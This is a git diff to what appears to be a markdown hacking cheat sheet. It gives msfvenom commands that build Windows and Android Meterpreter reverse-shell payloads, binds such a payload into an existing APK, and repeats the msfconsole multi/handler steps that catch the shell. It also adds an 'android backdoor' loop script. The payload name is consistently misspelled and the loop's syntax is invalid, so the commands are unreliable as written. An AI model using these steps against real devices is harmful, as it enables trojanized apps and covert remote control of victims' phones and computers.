@@ -6,6 +6,11 @@ create payload
 msfvenom -p windows/meterpreter/reverce_tcp --platform windows -a x86 -f exe LHOST=<youtIP> LPORT=444 -o <PayloadPath>
 msfvenom -p android/meterpreter/reverce_tcp --platform android LHOST=<youtIP> LPORT=444 -o <PayloadPath>
 ```
+bind to android app
+```
+msfvenom -x <YOURAPP.apk> android/meterpreter/reverce_tcp LHOST=<youtIP> LPORT=444 -o <PayloadPath.apk>
+```
+
 connect to target
 ```
 msfconsole
@@ -14,6 +19,17 @@ set payload <windows>/<android>/meterpreter/reverce_tcp
 set LHOST <>
 set LPORT <>
 exploit
+```
+
+create android backdoor
+
+bash.sh:
+```
+while true:
+  do
+    <open-app> 
+    sleep 20000
+  done
 ```
 ## windows/linux Attiny85
 create payload windows
@@ -132,4 +148,13 @@ digitalWrite(1, LOW);
 delay(300);
 
 }
+```
+connect to target
+```
+msfconsole
+use multi/handler
+set payload <windows>/<android>/meterpreter/reverce_tcp
+set LHOST <>
+set LPORT <>
+exploit
 ```
